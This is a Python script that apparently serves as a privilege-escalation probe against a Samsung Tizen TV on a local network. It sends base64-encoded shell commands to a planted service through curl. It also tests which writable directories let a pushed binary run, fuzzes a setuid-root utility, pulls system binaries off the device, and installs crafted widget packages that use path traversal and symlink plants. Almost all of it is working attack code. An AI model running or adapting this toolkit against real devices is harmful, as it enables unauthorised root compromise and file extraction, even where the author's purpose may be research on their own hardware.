#!/usr/bin/env python3
"""Post-wake probe matrix. Run the moment the TV (192.168.0.85) is on.
Non-destructive: recon + exec-mmap matrix + wasutility surface + pending attack-wgt installs."""
import sys, time, base64, subprocess
import os as _os; sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
from sdblib import Sdb

TV = '192.168.0.85'
APP = 'xvvl3S1bvH.TizenBrewStandalone'   # installed TizenBrew anchor (uid 5001 exec)

def tv_cmd(c, timeout=45):
    """Run command in the uid-5001 node service; returns text."""
    b = base64.b64encode(c.encode()).decode()
    r = subprocess.run(['curl', '-s', '-G', '-m', str(timeout),
                        'http://%s:9192/x' % TV, '--data-urlencode', 'c=' + b],
                       capture_output=True, text=True)
    return r.stdout

def ensure_service(sdb):
    for _ in range(6):
        out = tv_cmd('id', 8)
        if 'uid=5001' in out:
            return True
        sdb.shell('0 was_execute ' + APP, r'launched|resumed|spend time', 25)
        time.sleep(4)
    return False

def main():
    sdb = Sdb(TV)
    print('== sdb banner:', sdb.banner[:80])

    # 0. sdbd 'debug' service usage probe (root-side; may reveal root debugserver)
    for svc in ('0 debug', '0 debug 1'):
        try: print('== dbgsvc %r ->' % svc, sdb.shell(svc, None, 6).strip()[:200])
        except Exception as e: print('== dbgsvc %r ->' % svc, 'ERR', e)

    # 1. relaunch module service
    if not ensure_service(sdb):
        print('!! module service would not come up; aborting'); return

    # 2. kdbus / env recon
    for c in ('ls -la /dev/kdbus/ 2>&1 | head -20',
              'ls -la /sys/fs/kdbus/ 2>&1 | head -20',
              'cat /proc/self/environ | tr "\\0" "\\n" | grep -i dbus',
              'ls -la /usr/bin/wrt-installer /usr/bin/pkgcmd /usr/bin/wasutility 2>&1',
              'ls -la /opt/dbspace/ 2>&1 | head -15'):
        print('== %s\n%s' % (c, tv_cmd(c)))

    # 3. exec-mmap matrix for our static ARM binary
    sdb.push('/home/owner/share/tmp/sdk_tools/tvprobe', open(_os.path.join(_os.path.dirname(_os.path.abspath(__file__)), 'tvprobe'), 'rb').read())
    for d in ('/run/user/5001', '/dev/shm', '/home/owner/share/tmp/sdk_tools',
              '/opt/usr/home/owner/apps_rw/xvvl3S1bvH/data'):
        c = ('cp /home/owner/share/tmp/sdk_tools/tvprobe %s/tp 2>&1; chmod 755 %s/tp 2>&1; %s/tp; echo RC=$?' % (d, d, d))
        print('== exec %s\n%s' % (d, tv_cmd(c)))

    # 4. wasutility surface (uid 5001 invoking setuid-root tool)
    for c in ('wasutility; echo RC=$?',
              'wasutility -a bogus.appid; echo RC=$?',
              'wasutility -d bogus.appid; echo RC=$?',
              'wasutility -v x; echo RC=$?',
              'wasutility -g x; echo RC=$?',
              'wasutility -e x; echo RC=$?',
              'wasutility -n; echo RC=$?',
              'wasutility -m x; echo RC=$?'):
        print('== %s\n%s' % (c, tv_cmd(c)))

    # 5. pull root-relevant binaries via base64 channel
    import os
    for remote, local in (('/usr/bin/wrt-installer', 'wrt-installer.bin'),
                          ('/usr/bin/pkgcmd', 'pkgcmd.bin'),
                          ('/usr/lib/libwrt-tmg-settings.so.0.1.0', 'libwrt-tmg-settings.so')):
        out = tv_cmd('base64 %s 2>&1 | tr -d "\\n"' % remote, 60)
        try:
            blob = base64.b64decode(out.strip())
            if blob[:4] == b'\x7fELF':
                open(_os.path.join(_os.path.dirname(_os.path.abspath(__file__)), local), 'wb').write(blob)
                print('== pulled %s (%d bytes)' % (local, len(blob)))
            else:
                print('== pull %s failed: %r' % (remote, out[:120]))
        except Exception as e:
            print('== pull %s failed: %s %r' % (remote, e, out[:120]))

    # 6. pending attack wgt installs (traversal + symlink plant)
    for wgt, pkgid, marks in (('wgttrav.wgt', 'leonbtrav1', ['/tmp/travA', '/tmp/travB']),
                              ('wgtsym.wgt', 'leonbsym1', ['/tmp/travC'])):
        r = '/home/owner/share/tmp/sdk_tools/' + wgt
        sdb.push(r, open(_os.path.join(_os.path.dirname(_os.path.abspath(__file__)), wgt), 'rb').read())
        out = sdb.shell('0 vd_appinstall %s ' % pkgid + r, r'spend time', 120)
        ok = 'install completed' in out
        print('== install %s: %s' % (wgt, 'OK' if ok else out.strip()[-150:]))
        if ok:
            chk = tv_cmd('ls -la %s 2>&1' % ' '.join('"%s"' % m for m in marks))
            print('== markers:\n%s' % chk)

if __name__ == '__main__':
    main()
